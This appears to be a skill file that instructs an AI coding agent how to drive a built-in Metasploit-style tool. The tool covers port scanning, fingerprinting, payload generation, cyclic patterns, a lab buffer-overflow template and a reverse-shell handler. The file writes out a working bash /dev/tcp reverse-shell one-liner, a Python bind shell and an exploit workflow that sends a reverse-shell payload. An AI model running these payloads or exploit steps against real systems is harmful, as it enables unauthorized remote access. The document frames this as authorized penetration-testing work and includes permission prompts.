---
name: msfx
description: Use when the user asks for Metasploit-style exploitation work against authorized targets — port scans, banner grabs, HTTP/SSH fingerprinting, reverse/bind shell payload generation (msfvenom-style), Metasploit cyclic pattern exploit-dev helpers, the lab stack-overflow exploit template, or the XOR encoder. Also when the user mentions metasploit, msfconsole, msfvenom, "use module", "set RHOSTS", or "run exploit". Covers all 9 built-in modules, the 7 supported operations, when to use msfx vs nmap, payload formats, and the exploit-dev workflow.
---

# msfx — Metasploit-style framework as a built-in Codeshod tool

Codeshod ships with `msfx`, a pure-Rust Metasploit-style exploitation framework, as a first-party built-in tool. It is registered under plugin id `codeshod.tool.msfx`, exposed to the model as the `msfx` tool, and bundled with every Codeshod installation (674 KB stripped binary at `packages/cli/assets/msfx/bin/`). It is NOT an MCP server and NOT a shell-out to system `metasploit-framework`.

**Authorized use only.** Use msfx exclusively against systems you own or have explicit written permission to test. Unauthorized scanning, exploitation, or payload deployment is illegal in most jurisdictions.

This skill teaches you when to use it, which operation and module to pick, and how to reason about the JSON result it returns.

## When To Use

Use the `msfx` tool when the user's intent is one of these:

- **Metasploit-style port scanning** with structured options (RHOSTS, PORTS, THREADS, TIMEOUT_MS) and a JSON result. Use the `auxiliary/scanner/portscan/tcp` module.
- **TCP banner grab** for FTP/SMTP/POP3/SSH/HTTP greeting-first services. Use `auxiliary/gather/banner_grab`.
- **HTTP server fingerprinting** — status line, Server, X-Powered-By, Content-Type. Use `auxiliary/scanner/http/http_version`.
- **SSH version banner extraction** — e.g. `SSH-2.0-OpenSSH_9.6p1`. Use `auxiliary/scanner/ssh/ssh_version`.
- **Reverse shell payload generation** (msfvenom-style) in sh / python / rust / bytes formats. Use `payload.generate` with `payload: "reverse_tcp"`.
- **Bind shell payload generation**. Use `payload.generate` with `payload: "bind_tcp"`.
- **Metasploit cyclic pattern** for exploit development — `pattern_create N` / `pattern_offset NEEDLE`.
- **Lab stack-overflow exploit template** — the educational BOF template that demonstrates the exploit→payload pipeline. Use `exploit/lab/stack_overflow_template`.
- **XOR encoder** — single-byte XOR for demonstrating the encoder interface. Use `encoder/generic/xor`.
- **Reverse TCP handler** — listen on LHOST:LPORT for callback shells. Use `auxiliary/handler/reverse_tcp` (with `WAIT_SEC` ≤ 30 inside the agent loop).
- **Module discovery** — list all modules, search by keyword, inspect a module's options.

The user said "metasploit", "msfconsole", "msfvenom", "use module", "set RHOSTS", "run exploit", "payload generator", "reverse shell", "bind shell", "pattern_create", or "pattern_offset" → use this skill.

## When To Use msfx vs nmap

Both tools can do port scanning and service fingerprinting. Pick by intent:

| Intent | Use |
|--------|-----|
| Pure port scan, fast, lightweight, no need for Metasploit semantics | `nmap` |
| OS fingerprinting, traceroute, TLS cert parsing, Rhai NSE scripts | `nmap` |
| Metasploit-style module system with `use`/`set`/`run` semantics | `msfx` |
| Generating reverse/bind shell payloads (msfvenom-style) | `msfx` |
| Metasploit pattern_create / pattern_offset exploit-dev helpers | `msfx` |
| BOF exploit template against a lab service | `msfx` |
| Reverse TCP handler that registers sessions | `msfx` |
| HTTP/SSH/banner fingerprinting with a single focused module | either — `msfx` returns structured `data` per-module; `nmap` returns a unified report |

When in doubt, start with `nmap` for reconnaissance and switch to `msfx` when the user asks for payload generation, exploit-dev helpers, or explicitly mentions Metasploit.

## When NOT To Use

- **Unauthorized targets.** Only use against systems you own or have explicit written permission to test. If the user asks to attack a target they do not own and have not asserted permission for, ask first.
- **Pure port scanning without service fingerprinting.** Prefer `nmap` — it's faster and produces a unified JSON report.
- **Local file reads / code search / web fetches.** Use `read`, `grep`, or `webfetch` instead.
- **Long-lived handlers.** The `auxiliary/handler/reverse_tcp` module with `WAIT_SEC > 30` will block the tool call. Set up the handler outside the agent loop or accept the wait.
- **Continuous monitoring.** The tool caps wall-clock time at 5 minutes per call.
- **Code Mode sessions.** The tool is not exposed in Code Mode (read-only filesystem mode).
- **TLS-targeted scans.** msfx's HTTP module is plain HTTP only (std has no TLS). Use `nmap --tls` for TLS cert inspection.

## Operations

The tool exposes a single `operation` parameter. Pick the right one:

| Operation | What it does | Required input fields |
|-----------|--------------|----------------------|
| `modules.list` | List every module (optionally filtered by type) | (none; optional `type`) |
| `module.info` | Show a module's metadata + option definitions | `module` |
| `module.run` | Execute a module with options | `module`, `options` (the module's required options) |
| `payload.generate` | Generate a reverse/bind shell payload | `payload`, `format`, `options` (LHOST/LPORT) |
| `pattern.create` | Generate a Metasploit cyclic pattern of length N | `patternLength` |
| `pattern.offset` | Find the offset of a needle in the cyclic pattern | `needle`, optional `patternMax` |
| `search` | Keyword search over module names/titles/descriptions | `keyword` |

## Built-in Modules (9)

| Module | Type | Options | What it does |
|--------|------|---------|--------------|
| `auxiliary/scanner/portscan/tcp` | scanner | RHOSTS (req), PORTS, THREADS, TIMEOUT_MS | Concurrent TCP connect scan |
| `auxiliary/gather/banner_grab` | scanner | RHOSTS (req), RPORT, PROBE, TIMEOUT_MS | Greeting/probe banner capture |
| `auxiliary/scanner/http/http_version` | scanner | RHOSTS (req), RPORT, PATH, VHOST, TIMEOUT_MS | HTTP status + Server/X-Powered-By/Content-Type |
| `auxiliary/scanner/ssh/ssh_version` | scanner | RHOSTS (req), RPORT, TIMEOUT_MS | SSH identification banner |
| `auxiliary/handler/reverse_tcp` | handler | LHOST, LPORT, WAIT_SEC | Listens for reverse-shell callbacks, registers sessions |
| `exploit/lab/stack_overflow_template` | exploit | RHOST (req), RPORT, PREFIX, OFFSET, RET, PAYLOAD, LHOST, LPORT, TIMEOUT_MS | Lab-only BOF exploit template |
| `payload/single/reverse_tcp` | payload | LHOST (req), LPORT | Generates reverse-shell one-liners (sh/python/rust/bytes) |
| `payload/single/bind_tcp` | payload | LPORT | Generates bind-shell one-liners (sh/python/rust/bytes) |
| `encoder/generic/xor` | encoder | INPUT_HEX (req), KEY | Single-byte XOR encoder |

Module name suffixes are accepted: `portscan/tcp` resolves to `auxiliary/scanner/portscan/tcp`, `reverse_tcp` (when generating a payload) resolves to `payload/single/reverse_tcp`.

## Output Reading

The tool returns a JSON object with shape:

```jsonc
{
  "operation": "module.run",
  "ok": true,
  "summary": "Scanned 4 host/port combination(s), 0 open",
  "data": {
    "log_lines": 4,
    "sessions": []   // sessions opened by handler/exploit modules
  },
  "log": [
    "[*] Using auxiliary/scanner/portscan/tcp",
    "RHOSTS => 127.0.0.1",
    "[*] Scanning 1 host(s) x 4 port(s) with 4 thread(s)",
    "[*] Scanned 4 host/port combination(s), 0 open"
  ],
  "raw": {
    "exitCode": 0,
    "stdout": "...",   // truncated to 16 KB
    "stderr": ""       // truncated to 4 KB
  }
}
```

Operation-specific `data` shapes:

- `modules.list` → array of `{ name, title, type, rank }`
- `module.info` → `{ text: "<full info output>" }`
- `module.run` → `{ log_lines: N, sessions: [{ id, peer, kind }] }` — sessions array is populated only when a handler/exploit opened sessions
- `payload.generate` → `{ payload: "<string>", format: "text"|"bytes", length: N }`
- `pattern.create` → `{ pattern: "Aa0Aa1...", length: N }`
- `pattern.offset` → `{ offset: N|null }`
- `search` → `{ hits: [{ name, rank, title }] }`

## Payload Formats

For `payload.generate`, the `format` parameter selects the output:

| Format | What it produces |
|--------|-----------------|
| `sh` | A shell one-liner (bash `/dev/tcp` for reverse, `nc -lvp` for bind) |
| `python` | A Python pty-based shell script |
| `rust` | A Rust starter program using `std::net::TcpStream` / `TcpListener` |
| `bytes` | Hex-encoded bytes (the sh one-liner as raw bytes) — for embedding in exploit buffers |

Example outputs:

```
# reverse_tcp, format=sh, LHOST=10.0.0.1, LPORT=4444
bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'

# bind_tcp, format=python, LPORT=5555
import os, pty, socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 5555))
s.listen(1)
c, _ = s.accept()
os.dup2(c.fileno(), 0)
os.dup2(c.fileno(), 1)
os.dup2(c.fileno(), 2)
pty.spawn("/bin/sh")
```

## Exit Codes

The tool surfaces the msfx exit code in `metadata.exitCode`:

| Code | Meaning | Tool behavior |
|------|---------|---------------|
| 0 | OK | Return parsed result with `ok: true` |
| 1 | Generic error | Return parsed result with `ok: false` and stderr surfaced |
| 2 | Unknown command / bad args | Return parsed result with `ok: false` and stderr surfaced |

Codes 1 and 2 do NOT fail the tool — the agent still gets stdout/stderr to reason about. Only timeout and process-spawn failures fail at the runMsfx layer.

## Recommended Workflows

### 1. Discover available modules

User: "what modules does msfx have?"

```
msfx({ operation: "modules.list" })
```

Or filtered by type:

```
msfx({ operation: "modules.list", type: "payload" })
```

### 2. Inspect a module's options

User: "what options does the portscan module take?"

```
msfx({ operation: "module.info", module: "portscan/tcp" })
```

### 3. TCP port scan

User: "scan 127.0.0.1 for ports 22, 80, 443, 8080 using msfx"

```
msfx({
  operation: "module.run",
  module: "portscan/tcp",
  options: {
    RHOSTS: "127.0.0.1",
    PORTS: "22,80,443,8080",
    THREADS: "16",
    TIMEOUT_MS: "1000"
  }
})
```

### 4. HTTP server fingerprint

User: "fingerprint the HTTP server on 10.0.0.5:80"

```
msfx({
  operation: "module.run",
  module: "http_version",
  options: {
    RHOSTS: "10.0.0.5",
    RPORT: "80",
    PATH: "/",
    TIMEOUT_MS: "2000"
  }
})
```

### 5. SSH version banner

User: "what SSH version is running on 10.0.0.5?"

```
msfx({
  operation: "module.run",
  module: "ssh_version",
  options: { RHOSTS: "10.0.0.5", RPORT: "22", TIMEOUT_MS: "2000" }
})
```

### 6. Generate a reverse shell payload (Python)

User: "give me a python reverse shell that calls back to 10.0.0.1:4444"

```
msfx({
  operation: "payload.generate",
  payload: "reverse_tcp",
  format: "python",
  options: { LHOST: "10.0.0.1", LPORT: "4444" }
})
```

### 7. Generate a bind shell payload (sh)

User: "generate a bind shell on port 5555"

```
msfx({
  operation: "payload.generate",
  payload: "bind_tcp",
  format: "sh",
  options: { LPORT: "5555" }
})
```

### 8. Cyclic pattern exploit-dev workflow

User (crashed a lab service, captured EIP): "I crashed the target with a cyclic pattern. Find the EIP offset for 'Ab0'."

```
// Step 1: send the cyclic pattern (run with OFFSET=0)
msfx({
  operation: "module.run",
  module: "stack_overflow_template",
  options: {
    RHOST: "10.0.0.10",
    RPORT: "9999",
    OFFSET: "0"   // pattern mode
  }
})

// Step 2: find the offset of the captured EIP value
msfx({
  operation: "pattern.offset",
  needle: "Ab0",
  patternMax: 100000
})
// → offset: 30

// Step 3: re-run with the offset and a return address
msfx({
  operation: "module.run",
  module: "stack_overflow_template",
  options: {
    RHOST: "10.0.0.10",
    RPORT: "9999",
    OFFSET: "30",
    RET: "625011af",   // target's JMP ESP address
    PAYLOAD: "payload/single/reverse_tcp",
    LHOST: "10.0.0.1",
    LPORT: "4444"
  }
})
```

### 9. Reverse TCP handler (authorized lab)

User: "set up a handler to catch the reverse shell on 10.0.0.1:4444"

```
msfx({
  operation: "module.run",
  module: "handler/reverse_tcp",
  options: {
    LHOST: "10.0.0.1",
    LPORT: "4444",
    WAIT_SEC: "30"   // ≤ 30 inside the agent loop
  }
})
```

The returned `data.sessions` array lists any sessions that connected during the wait.

### 10. XOR encoder

User: "XOR-encode the bytes 41424344 with key 0x5a"

```
msfx({
  operation: "module.run",
  module: "xor",
  options: { INPUT_HEX: "41424344", KEY: "0x5a" }
})
// → encoded_hex: "1b18191e"
```

### 11. Search modules by keyword

User: "find any modules related to ssh"

```
msfx({ operation: "search", keyword: "ssh" })
// → hits: [{ name: "auxiliary/scanner/ssh/ssh_version", rank: "normal", title: "SSH Server Version Detector" }]
```

## Privilege Notes

- The current msfx modules are all **unprivileged** — TCP connect scan, banner grab, HTTP/SSH fingerprinting, handler bind, payload generation, encoder, and the lab exploit template all work without root.
- Unlike `nmap`, msfx does NOT implement raw-socket scans (SYN/FIN/Xmas/Null) or ICMP-based host discovery. If you need those, use the `nmap` tool.
- The `auxiliary/handler/reverse_tcp` module binds to `LHOST:LPORT` — if LHOST is `0.0.0.0` and LPORT < 1024, root is required. Default LPORT is 4444 (unprivileged).

## Permission Patterns

The tool asserts `action: "msfx"` against an operation-specific resource. Suggested repository permission rules:

```jsonc
// .codeshod/codeshod.jsonc — permission section
{
  "permission": {
    "rules": [
      // Allow lab and localhost targets for module.run
      { "action": "msfx", "resource": "127.0.0.1", "effect": "allow" },
      { "action": "msfx", "resource": "10.0.0.0/8", "effect": "allow" },
      { "action": "msfx", "resource": "192.168.0.0/16", "effect": "allow" },
      // Always ask before generating payloads (sensitive output)
      { "action": "msfx", "resource": "payload/*", "effect": "ask" },
      { "action": "msfx", "resource": "reverse_tcp", "effect": "ask" },
      { "action": "msfx", "resource": "bind_tcp", "effect": "ask" },
      // Allow read-only operations without asking
      { "action": "msfx", "resource": "modules.list", "effect": "allow" },
      { "action": "msfx", "resource": "search", "effect": "allow" },
      { "action": "msfx", "resource": "module.info", "effect": "allow" },
      { "action": "msfx", "resource": "pattern.create", "effect": "allow" },
      { "action": "msfx", "resource": "pattern.offset", "effect": "allow" },
      // Ask before any other module.run
      { "action": "msfx", "resource": "*", "effect": "ask" }
    ]
  }
}
```

External targets and payload generation always prompt the user with the full operation shape (module, options, payload, format) so they can verify authorization before approving.

## Common Mistakes

- **Don't run the handler with `WAIT_SEC > 30` inside the agent loop.** The tool call blocks for the wait duration. Set up long-lived handlers outside the agent loop.
- **Don't expect `msfx rpc` to be available.** The tool intentionally does NOT expose the long-lived RPC server. Every action is one-shot.
- **Don't use msfx for OS fingerprinting or traceroute.** Those are nmap features. Use the `nmap` tool instead.
- **Don't pass options with shell-escaped single quotes.** The tool wraps the `-x` script in double quotes and uses `escapeForDoubleQuoted` internally — option values pass through with commas, slashes, and colons intact. The agent just provides raw values like `"22,80,443"`.
- **Don't forget required options.** The `module.run` operation will fail with `[-] Missing required option(s): RHOSTS` if a required option is missing. Use `module.info` first to see what a module requires.
- **Don't expect TLS.** msfx's HTTP module is plain HTTP only. For HTTPS, use `nmap --tls` or `webfetch`.
- **Don't trust the `encoder/generic/xor` for real evasion.** It's a demo of the encoder interface — XOR is symmetric and trivially detectable.
- **Don't expect real exploits.** The `exploit/lab/stack_overflow_template` is a TEMPLATE for exploit development against your own lab service. It ships no exploit for any real software.

## Source

- The tool plugin: `packages/core/src/tool/plugin/msfx.ts`
- The framework source: `packages/cli/assets/msfx/` (binary + README)
- The contract: `specs/v2/tools.md#built-in-metasploit-style-framework-msfx`
- Contributor notes: `AGENTS.md#built-in-msfx-tool`

If the msfx binary is missing from `packages/cli/assets/msfx/bin/`, the tool falls back to `msfx` on `PATH` and finally fails with a clear error. For dev worktrees, set `CODESHOD_MSFX_BIN=/path/to/msfx` to override.
